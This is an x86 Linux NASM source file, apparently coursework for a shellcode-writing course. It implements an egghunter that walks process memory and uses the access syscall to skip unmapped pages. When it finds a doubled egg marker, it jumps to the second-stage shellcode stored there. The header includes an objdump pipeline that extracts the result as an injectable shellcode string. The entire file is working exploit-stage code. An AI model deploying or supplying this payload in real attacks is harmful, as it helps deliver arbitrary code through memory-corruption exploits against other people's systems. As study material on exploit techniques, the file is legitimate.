; Filename:      egghunter.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  05.12.2018
; Note:          x86 code but assembled and linked on x64
; Assembler:     nasm -f elf32 egghunter.nasm -o egghunter.o
; Linker:        ld -m elf_i386 egghunter.o -o egghunter
; Assembly dump: objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	; Egg hunter

	mov ebx,0x50905090  ; X,NOP,X,NOP
	xor ecx, ecx        ; Clear ecx register
	mul ecx             ; EDX:EAX <- EAX * r/m32 0*eax=0 (Clear eax & edx)

next_page:

	or dx,0xfff         ; edx = 0x00000fff  Memory alignment

next_address:

	inc edx             ; edx + 1
	pusha               ; Push to stack in the following order: AX, CX, DX, BX, SP, BP, SI, DI
	lea ebx,[edx+0x4]   ; ebx = 0x00001004
	mov al,0x21         ; eax = 0x00000021 = 33
	int 0x80            ; sys_access

	cmp al,0xf2         ; Compare return in al of sys_access with 0xf2 (EFAULT) and set ZF flag
	popa                ; Restore all registers
	jz next_page        ; if EFAULT jump to nextpage

	cmp [edx],ebx       ; Compare edx with egg
	jnz next_address    ; If not egg jum to inc edx
	cmp [edx+0x4],ebx   ; Compare next four byte for our double eggs
	jnz next_address    ; If not second egg jump to next address
	jmp edx             ; Start second stage shellcode
